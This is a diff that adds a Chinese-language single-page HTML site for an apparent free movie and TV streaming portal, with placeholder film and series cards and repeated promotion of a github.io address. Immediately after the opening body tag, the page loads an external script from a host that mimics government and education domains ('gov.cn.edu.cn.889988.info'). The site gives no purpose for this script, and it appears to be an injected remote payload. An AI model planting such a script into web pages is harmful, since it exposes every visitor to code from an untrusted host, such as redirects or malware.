@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>被窝电影网在线观看 - 免费电影电视剧动漫在线观看</title>
+  <meta name="description" content="被窝电影网在线观看，提供电影、热播剧集、动漫综艺等高清资源在线观看。被窝电影网在线观看官网：https://beiwodianyingwangzaixianguankan-app.github.io" />
+  <meta name="keywords" content="被窝电影网在线观看, 被窝电影网, 在线观看, 电影在线观看, 电视剧在线观看, 动漫在线观看" />
+  <meta name="author" content="被窝电影网在线观看" />
+  <style>
+    :root {
+      --bg: #0b0f1a;
+      --bg-soft: #121829;
+      --card: rgba(255, 255, 255, 0.06);
+      --line: rgba(255, 255, 255, 0.12);
+      --text: #e8ecf6;
+      --muted: #9aa6c2;
+      --primary: #ff4d8d;
+      --primary-2: #7c5cff;
+      --accent: #36e0c8;
+      --radius: 18px;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      margin: 0;
+      font-family: system-ui, -apple-system, "PingFang SC", "Microsoft YaHei", sans-serif;
+      background:
+        radial-gradient(1200px 600px at 10% -10%, rgba(124, 92, 255, 0.25), transparent 60%),
+        radial-gradient(1000px 500px at 100% 0%, rgba(255, 77, 141, 0.18), transparent 55%),
+        var(--bg);
+      color: var(--text);
+      line-height: 1.75;
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    .wrap {
+      width: min(1120px, 92vw);
+      margin: 0 auto;
+    }
+
+    /* NAV */
+    header.nav {
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      backdrop-filter: blur(14px);
+      background: rgba(11, 15, 26, 0.72);
+      border-bottom: 1px solid var(--line);
+    }
+
+    .nav-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 14px 0;
+    }
+
+    .logo {
+      font-weight: 800;
+      letter-spacing: 0.5px;
+      font-size: 18px;
+      background: linear-gradient(90deg, var(--primary), var(--primary-2));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    nav ul {
+      list-style: none;
+      display: flex;
+      gap: 18px;
+      margin: 0;
+      padding: 0;
+    }
+
+    nav a {
+      color: var(--muted);
+      font-size: 15px;
+      padding: 8px 12px;
+      border-radius: 999px;
+      transition: 0.25s;
+    }
+
+    nav a:hover {
+      color: #fff;
+      background: rgba(255, 255, 255, 0.08);
+    }
+
+    /* HERO */
+    .hero {
+      padding: 84px 0 64px;
+      text-align: center;
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 6px 14px;
+      border: 1px solid var(--line);
+      border-radius: 999px;
+      color: var(--accent);
+      font-size: 13px;
+      margin-bottom: 18px;
+    }
+
+    h1 {
+      font-size: clamp(30px, 6vw, 56px);
+      margin: 0 0 18px;
+      line-height: 1.15;
+    }
+
+    h1 span {
+      background: linear-gradient(90deg, var(--primary), var(--primary-2), var(--accent));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .hero p {
+      color: var(--muted);
+      max-width: 720px;
+      margin: 0 auto 28px;
+      font-size: 17px;
+    }
+
+    .cta {
+      display: inline-flex;
+      gap: 14px;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+
+    .btn {
+      padding: 13px 26px;
+      border-radius: 999px;
+      font-weight: 700;
+      border: 1px solid transparent;
+      cursor: pointer;
+      transition: 0.25s;
+    }
+
+    .btn-primary {
+      background: linear-gradient(90deg, var(--primary), var(--primary-2));
+      color: #fff;
+    }
+
+    .btn-ghost {
+      border-color: var(--line);
+      color: var(--text);
+      background: rgba(255, 255, 255, 0.04);
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      opacity: 0.95;
+    }
+
+    /* SECTION */
+    section.block {
+      padding: 60px 0;
+      border-top: 1px solid var(--line);
+    }
+
+    .sec-head {
+      margin-bottom: 28px;
+    }
+
+    .sec-head h2 {
+      font-size: clamp(24px, 4vw, 34px);
+      margin: 0 0 8px;
+    }
+
+    .sec-head p {
+      color: var(--muted);
+      margin: 0;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 18px;
+    }
+
+    .card {
+      background: var(--card);
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      padding: 22px;
+      transition: 0.25s;
+    }
+
+    .card:hover {
+      transform: translateY(-4px);
+      border-color: rgba(124, 92, 255, 0.55);
+      background: rgba(124, 92, 255, 0.08);
+    }
+
+    .tag {
+      font-size: 12px;
+      color: var(--accent);
+      border: 1px solid var(--line);
+      padding: 3px 10px;
+      border-radius: 999px;
+      display: inline-block;
+      margin-bottom: 12px;
+    }
+
+    .card h3 {
+      margin: 0 0 10px;
+      font-size: 19px;
+    }
+
+    .card p {
+      color: var(--muted);
+      margin: 0 0 16px;
+      font-size: 15px;
+    }
+
+    .card a.more {
+      color: var(--primary);
+      font-weight: 700;
+      font-size: 14px;
+    }
+
+    /* ABOUT */
+    .about {
+      display: grid;
+      grid-template-columns: 1.2fr 0.8fr;
+      gap: 24px;
+    }
+
+    .about .box {
+      background: var(--bg-soft);
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      padding: 26px;
+    }
+
+    .about ul {
+      margin: 12px 0 0;
+      padding-left: 20px;
+      color: var(--muted);
+    }
+
+    .site-url {
+      word-break: break-all;
+      color: var(--accent);
+      font-weight: 700;
+    }
+
+    /* FOOTER */
+    footer {
+      padding: 40px 0 60px;
+      border-top: 1px solid var(--line);
+      color: var(--muted);
+      text-align: center;
+      font-size: 14px;
+    }
+
+    footer a {
+      color: var(--muted);
+      margin: 0 10px;
+    }
+
+    footer a:hover {
+      color: #fff;
+    }
+
+    @media (max-width: 760px) {
+      nav ul {
+        gap: 10px;
+        flex-wrap: wrap;
+        justify-content: center;
+      }
+      .nav-inner {
+        flex-direction: column;
+        gap: 12px;
+      }
+      .about {
+        grid-template-columns: 1fr;
+      }
+      .hero {
+        padding: 60px 0 44px;
+      }
+    }
+  </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+  <header class="nav">
+    <div class="wrap nav-inner">
+      <div class="logo">被窝电影网在线观看</div>
+      <nav>
+        <ul>
+          <li><a href="#home">首页</a></li>
+          <li><a href="#movie">电影推荐</a></li>
+          <li><a href="#tv">热播剧集</a></li>
+          <li><a href="#anime">动漫综艺</a></li>
+          <li><a href="#about">关于本站</a></li>
+          <li><a href="#">登录</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <!-- 首页 -->
+    <section id="home" class="hero wrap">
+      <span class="badge">被窝电影网在线观看 · 单页版</span>
+      <h1>被窝电影网在线观看<br />
+        <span>电影 / 剧集 / 动漫一站式看片</span>
+      </h1>
+      <p>
+        被窝电影网在线观看，聚合热门电影、电视剧、动漫、综艺资源，
+        支持手机端自适应浏览，随时随地躺进“被窝”看片。
+        官网地址：<span class="site-url">https://beiwodianyingwangzaixianguankan-app.github.io</span>
+      </p>
+      <div class="cta">
+        <a class="btn btn-primary" href="#movie">马上看电影</a>
+        <a class="btn btn-ghost" href="#tv">看热播剧集</a>
+      </div>
+    </section>
+
+    <!-- 电影推荐 -->
+    <section id="movie" class="block">
+      <div class="wrap">
+        <div class="sec-head">
+          <h2>电影推荐</h2>
+          <p>被窝电影网在线观看精选高分电影，动作、悬疑、爱情、科幻全覆盖。</p>
+        </div>
+        <div class="grid">
+          <div class="card">
+            <span class="tag">动作 / 科幻</span>
+            <h3>星际边境：觉醒</h3>
+            <p>宇宙舰队坠入未知星域，幸存者在冰原与机械文明之间寻找归途。</p>
+            <a class="more" href="#">立即播放 ›</a>
+          </div>
+          <div class="card">
+            <span class="tag">悬疑 / 犯罪</span>
+            <h3>夜雾来电</h3>
+            <p>一通凌晨来电牵出十年旧案，真相藏在城市监控的最后一帧画面里。</p>
+            <a class="more" href="#">立即播放 ›</a>
+          </div>
+          <div class="card">
+            <span class="tag">爱情 / 治愈</span>
+            <h3>晚风便利店</h3>
+            <p>深夜便利店的两个夜班人，用关东煮和便利贴慢慢靠近彼此。</p>
+            <a class="more" href="#">立即播放 ›</a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 热播剧集 -->
+    <section id="tv" class="block">
+      <div class="wrap">
+        <div class="sec-head">
+          <h2>热播剧集</h2>
+          <p>被窝电影网在线观看更新国产剧、韩剧、美剧、港剧，追剧不用来回跳站。</p>
+        </div>
+        <div class="grid">
+          <div class="card">
+            <span class="tag">国产剧</span>
+            <h3>长安灯下录</h3>
+            <p>大唐夜市命案连环，仵作与女商贾联手查案，权谋与烟火气交织。</p>
+            <a class="more" href="#">立即追剧 ›</a>
+          </div>
+          <div class="card">
+            <span class="tag">韩剧</span>
+            <h3>首尔重启计划</h3>
+            <p>破产编剧和过气顶流被迫合写一部“绝对不能烂”的复仇剧本。</p>
+            <a class="more" href="#">立即追剧 ›</a>
+          </div>
+          <div class="card">
+            <span class="tag">美剧</span>
+            <h3>暗潮调查局</h3>
+            <p>海岸小镇失踪案牵出深海实验室，每一集都在推翻上一集的真相。</p>
+            <a class="more" href="#">立即追剧 ›</a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 动漫综艺 -->
+    <section id="anime" class="block">
+      <div class="wrap">
+        <div class="sec-head">
+          <h2>动漫综艺</h2>
+          <p>热血番、治愈番、脑洞综艺，被窝电影网在线观看帮你把片单排满。</p>
+        </div>
+        <div class="grid">
+          <div class="card">
+            <span class="tag">国漫</span>
+            <h3>山海拾遗录</h3>
+            <p>少年背着青铜罗盘走遍九州，把《山海经》里跑出来的神兽一一送回家。</p>
+            <a class="more" href="#">立即观看 ›</a>
+          </div>
+          <div class="card">
+            <span class="tag">日番</span>
+            <h3>午夜列车开往异界</h3>
+            <p>末班车乘客每人抽到一个“超能力”，但下车条件是要先讲完自己的遗憾。</p>
+            <a class="more" href="#">立即观看 ›</a>
+          </div>
+          <div class="card">
+            <span class="tag">综艺</span>
+            <h3>被窝夜聊局</h3>
+            <p>嘉宾裹着毯子聊职场、恋爱、房贷和噩梦，笑点和泪点轮流上桌。</p>
+            <a class="more" href="#">立即观看 ›</a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 关于本站 -->
+    <section id="about" class="block">
+      <div class="wrap">
+        <div class="sec-head">
+          <h2>关于本站</h2>
+          <p>被窝电影网在线观看：一个轻量、移动端友好、专注“躺着也能看”的影视导航站。</p>
+        </div>
+        <div class="about">
+          <div class="box">
+            <h3>站点说明</h3>
+            <p>
+              被窝电影网在线观看致力于整理电影、电视剧、动漫、综艺等影视内容入口，
+              页面采用单页结构，栏目通过锚点切换，加载快、广告少、手机更好点。
+            </p>
+            <ul>
+              <li>电影推荐：院线、网大、高分老片</li>
+              <li>热播剧集：国产、韩剧、美剧、港剧</li>
+              <li>动漫综艺：国漫、日番、治愈番、访谈综艺</li>
+              <li>移动端自适应，必应搜索更容易读懂页面结构</li>
+            </ul>
+          </div>
+          <div class="box">
+            <h3>官网地址</h3>
+            <p>被窝电影网在线观看官网：</p>
+            <p class="site-url">https://beiwodianyingwangzaixianguankan-app.github.io</p>
+            <p>内页链接当前以 <code>#</code> 占位，后续可替换为真实播放页或分类页。</p>
+            <a class="btn btn-primary" href="#">前往资源页</a>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <div class="wrap">
+      <div>
+        <a href="#home">首页</a>
+        <a href="#movie">电影</a>
+        <a href="#tv">剧集</a>
+        <a href="#anime">动漫综艺</a>
+        <a href="#about">关于</a>
+        <a href="#">反馈</a>
+      </div>
+      <p>© 2026 被窝电影网在线观看 · 单页演示站</p>
+      <p>官网：https://beiwodianyingwangzaixianguankan-app.github.io</p>
+    </div>
+  </footer>
+
+</body>
+</html>
